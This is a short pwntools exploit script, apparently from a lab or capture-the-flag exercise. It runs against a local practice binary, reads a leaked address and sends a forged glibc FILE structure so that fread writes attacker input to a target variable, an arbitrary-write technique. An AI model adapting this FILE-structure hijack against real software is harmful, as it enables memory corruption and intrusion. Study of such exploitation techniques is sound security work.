from pwn import *


context.arch = "amd64"
context.log_level = "debug"
io = process("./read_example.elf")

io.recvuntil(b'at: ')
win_var_addr = int(io.recvline().strip(), 16)
# print('win_var addr:', hex(win_var_addr))
# win_var is located at: 0x5e818ef5d014

# overwrite the file struct
fs = FileStructure()
payload = fs.read(win_var_addr, 20)
# print("fs.read payload:", payload)
# print(fs)

# hijack buf to win_var_addr
#  _IO_buf_base: 0x5e818ef5d014
#  _IO_buf_end: 0x5e818ef5d028
# fileno: 0x0 | so the fread input from stdin

io.send(payload)
io.sendline(cyclic(10))
io.interactive()
